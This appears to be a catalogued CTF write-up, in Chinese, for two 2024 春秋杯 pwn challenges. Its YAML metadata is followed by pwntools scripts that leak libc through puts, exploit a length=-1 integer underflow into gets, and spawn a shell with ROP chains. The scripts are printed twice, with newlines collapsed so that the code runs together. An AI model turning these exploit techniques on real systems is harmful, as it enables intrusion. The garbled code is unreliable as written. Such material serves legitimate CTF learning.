---
title: web选手入门pwn(17) 2024春秋杯夏季赛pwn
contest: 春秋杯
year: 2024
difficulty: easy
vuln_type: rop
tags:
- ret2libc
- stack-overflow
- ret2vuln-loop
- 整数溢出
- prng爆破
attack_chain: 题目1循环ret2vuln+extend堆喷对齐栈帧触发printf泄libc+ret2libc / 题目2password=base64(this is password)登录+length=-1整数下溢触发gets→覆盖saved RBP+返回地址
key_payload: 题目2 length=-1 整数下溢 + payload A*104 + p64(pop_rdi_ret) + p64(binsh) + p64(system) 覆盖PRNG栈槽
one_liner: 春秋杯两题入门ROP，覆盖ret2vuln循环喷射+整数下溢gets覆盖的经典入门路径。
lesson: length字段使用int32比较但调用gets时无符号，length=-1溢出为最大正值绕过长度检查；ret2vuln+extend操作本质是栈空间对齐+控制字刷新printf参数。
quality: high
full_path: web选手入门pwn(17)_——2024年春秋杯夏季赛pwn.full.md
meta_path: web选手入门pwn(17)_——2024年春秋杯夏季赛pwn.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: web选手入门pwn(17) 2024春秋杯夏季赛pwn。春秋杯两题入门ROP，覆盖ret2vuln循环喷射+整数下溢gets覆盖的经典入门路径。。经验：length字段使用int32比较但调用gets时无符号，length=-1溢出为最大正值绕过长度检查；ret2vuln...
category: pwn
subcategory: rop
time_required: quick
difficulty_score: 2
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/198409.html
reasoning_chain:
- 题目 1 vuln 函数循环 ret2vuln，extend 操作把堆栈对齐并刷新 printf 参数 → 触发点：循环重入 + printf 残基泄 libc
- 假设：循环重入 + payload B*40+pop_rdi+got_puts+puts_plt+vuln + extend 多次喷 printf 残基 → 动作：sendline 21 次 B payload
- 观察：sh.recvuntil("x7f") 泄 puts_addr → libc_base=puts_addr-libc_puts → 下一步：ret2libc
- 假设：vuln 循环可继续执行到 system → 动作：payload B*40+pop_rdi+binsh+system
- 题目 2 login root / A*34 password → choice=3 length=-1 → 触发点：length 字段 int32 比较但内部为 size_t（无符号）
- 假设：length=-1 (int32) 但内部 size_t 比较时变 SIZE_MAX → 绕过长度检查 → gets 任意长写
- 动作：payload A*104 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(bio_fun) → 观察：泄 text_base + puts
- 下一步：libc_base = puts_addr - libc_puts → system payload A*104 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
failed_attempts:
- 题目 2 试图直接覆盖返回地址 → 失败：有 canary
- 题目 2 试图覆盖 saved RBP 触发 stack pivot → 失败：没有已知栈地址锚点
- 题目 1 试图一次发送完成泄 + getshell → 失败：vuln 循环需要多次交互才能让 printf 残基稳定
key_observations:
- length 字段使用 int32 比较但调用 gets 时无符号，length=-1 溢出为最大正值绕过长度检查
- ret2vuln + extend 操作本质是栈空间对齐 + 控制字刷新 printf 参数
- extendsyscall 多 gadget 链用 pop_rdi/pop_rsi_r15/pop_rdx_r12 链式调用
- puts_plt + puts_got 泄露 + ELF.text 基址还原是入门 pwn 标准动作
prerequisites:
- pwntools 基本使用（ELF / p64 / sendlineafter / gdb.debug）
- GDB 断点 + vmmap + stack 调试
- ROP 基础（ret2libc / ret2vuln 循环）
- 整数符号与扩展（int32 vs size_t）
---
# web选手入门pwn(17) ——2024年春秋杯夏季赛pwn

> 原文: https://www.ctfiot.com/198409.html
> ID: 198409

from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./pwn","b *vulnnc")#sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
vuln = 0x40125D
payload = "A"*88 + p64(vuln)sh.sendline(payload)
sh.interactive()

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']vuln = 0x40125Dpop_rdi_ret = 0x4013d3
payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(exit_plt)sh.send(payload)sh.interactive()

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']extend = 0x401287vuln = 0x40125Dpop_rdi_ret = 0x4013d3
payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(vuln)sh.send(payload)payload = "B"*40 + p64(extend) + p64(vuln)for i in range(0,21): sh.send(payload)
sh.interactive()

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")libc_puts = libc.sym['puts']libc_system = libc.sym['execve']libc_binsh = libc.search('/bin/sh').next()
puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']extend = 0x401287vuln = 0x40125Dpop_rdi_ret = 0x4013d3pop_rsi_r15_ret = 0x4013d1

payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(vuln)sh.send(payload)payload = "B"*40 + p64(extend) + p64(vuln)for i in range(0,21): sh.send(payload)
puts_addr = u64(sh.recvuntil("x7f")[-6:]+"x00x00")print(hex(puts_addr))libc_base = puts_addr - libc_putssystem_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_base
pop_rdx_r12_ret = 0x11c1e1 + libc_base
payload = "B"*40 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(pop_rsi_r15_ret) + p64(0)+ p64(0) + p64(pop_rdx_r12_ret) + p64(0) + p64(0) + p64(system_addr)sh.send(payload)
sh.interactive()

dGhpcyBpcyBwYXNzd29yZA==[0x0]dGhpcyBpcyBwYXNzd29yZA==[0x1]

from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./main","b *0x5555555554fanc")#sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")sh.sendlineafter("length: ","-1")sh.interactive()

sh.sendline("A"*72)

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")sh.sendlineafter("length: ","-1")
payload = "A"*72sh.sendline(payload)text_1297 = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")text_base = text_1297 - 0x1297#print(hex(text_base))puts_plt = elf.plt['puts'] + text_baseputs_got = elf.got['puts'] + text_basepop_rdi_ret = 0x1751 + text_basebio_fun = 0x146A + text_base
sh.sendlineafter("n]","n")sh.sendlineafter("length: ","-1")
payload = "A"*104 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(bio_fun)sh.sendline(payload)sh.sendlineafter("n]","y")
sh.interactive()

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")libc_puts = libc.sym['puts']libc_system = libc.sym['system']libc_binsh = libc.search('/bin/sh').next()

sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")
sh.sendlineafter("length: ","-1")payload = "A"*72sh.sendline(payload)text_1297 = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")text_base = text_1297 - 0x1297print(hex(text_base))puts_plt = elf.plt['puts'] + text_baseputs_got = elf.got['puts'] + text_basepop_rdi_ret = 0x1751 + text_baseret = 0x1567 + text_basebio_fun = 0x146A + text_basesh.sendlineafter("n]","n")
sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(bio_fun)sh.sendline(payload)sh.sendlineafter("n]","y")
puts_addr = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = puts_addr - libc_putsprint(hex(libc_base))system_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_base
sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)sh.sendline(payload)sh.sendlineafter("n]","y")
sh.interactive()

from pwn import *
context.log_level = 'debug'context.arch='amd64'
#sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")libc_atoi = libc.sym['atoi']libc_system = libc.sym['system']libc_binsh = libc.search('/bin/sh').next()

sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")
sh.sendlineafter("length: ","-1")payload = "A"*56sh.sendline(payload)atoi_16_addr = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")libc_base = atoi_16_addr - libc_atoi - 16print(hex(libc_base))system_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_basepop_rdi_ret = 0x27725 + libc_baseret = 0x270c2 + libc_basesh.sendlineafter("n]","n")
sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)sh.sendline(payload)sh.sendlineafter("n]","y")
sh.interactive()


```
from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./pwn","b *vulnnc")#sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
vuln = 0x40125D
payload = "A"*88 + p64(vuln)sh.sendline(payload)
sh.interactive()
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']vuln = 0x40125Dpop_rdi_ret = 0x4013d3
payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(exit_plt)sh.send(payload)sh.interactive()
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']extend = 0x401287vuln = 0x40125Dpop_rdi_ret = 0x4013d3
payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(vuln)sh.send(payload)payload = "B"*40 + p64(extend) + p64(vuln)for i in range(0,21): sh.send(payload)
sh.interactive()
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")libc_puts = libc.sym['puts']libc_system = libc.sym['execve']libc_binsh = libc.search('/bin/sh').next()
puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']extend = 0x401287vuln = 0x40125Dpop_rdi_ret = 0x4013d3pop_rsi_r15_ret = 0x4013d1

payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(vuln)sh.send(payload)payload = "B"*40 + p64(extend) + p64(vuln)for i in range(0,21): sh.send(payload)
puts_addr = u64(sh.recvuntil("x7f")[-6:]+"x00x00")print(hex(puts_addr))libc_base = puts_addr - libc_putssystem_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_base
pop_rdx_r12_ret = 0x11c1e1 + libc_base
payload = "B"*40 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(pop_rsi_r15_ret) + p64(0)+ p64(0) + p64(pop_rdx_r12_ret) + p64(0) + p64(0) + p64(system_addr)sh.send(payload)
sh.interactive()
dGhpcyBpcyBwYXNzd29yZA==[0x0]dGhpcyBpcyBwYXNzd29yZA==[0x1]
from pwn import *
context.log_level = 'debug'context.arch='amd64'
sh = gdb.debug("./main","b *0x5555555554fanc")#sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")sh.sendlineafter("length: ","-1")sh.interactive()
sh.sendline("A"*72)
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")sh.sendlineafter("length: ","-1")
payload = "A"*72sh.sendline(payload)text_1297 = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")text_base = text_1297 - 0x1297#print(hex(text_base))puts_plt = elf.plt['puts'] + text_baseputs_got = elf.got['puts'] + text_basepop_rdi_ret = 0x1751 + text_basebio_fun = 0x146A + text_base
sh.sendlineafter("n]","n")sh.sendlineafter("length: ","-1")
payload = "A"*104 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(bio_fun)sh.sendline(payload)sh.sendlineafter("n]","y")
sh.interactive()
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")libc_puts = libc.sym['puts']libc_system = libc.sym['system']libc_binsh = libc.search('/bin/sh').next()

sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")
sh.sendlineafter("length: ","-1")payload = "A"*72sh.sendline(payload)text_1297 = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")text_base = text_1297 - 0x1297print(hex(text_base))puts_plt = elf.plt['puts'] + text_baseputs_got = elf.got['puts'] + text_basepop_rdi_ret = 0x1751 + text_baseret = 0x1567 + text_basebio_fun = 0x146A + text_basesh.sendlineafter("n]","n")
sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(bio_fun)sh.sendline(payload)sh.sendlineafter("n]","y")
puts_addr = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = puts_addr - libc_putsprint(hex(libc_base))system_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_base
sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)sh.sendline(payload)sh.sendlineafter("n]","y")
sh.interactive()
from pwn import *
context.log_level = 'debug'context.arch='amd64'
    #sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")libc_atoi = libc.sym['atoi']libc_system = libc.sym['system']libc_binsh = libc.search('/bin/sh').next()

sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")
sh.sendlineafter("length: ","-1")payload = "A"*56sh.sendline(payload)atoi_16_addr = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")libc_base = atoi_16_addr - libc_atoi - 16print(hex(libc_base))system_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_basepop_rdi_ret = 0x27725 + libc_baseret = 0x270c2 + libc_basesh.sendlineafter("n]","n")
sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)sh.sendline(payload)sh.sendlineafter("n]","y")
sh.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]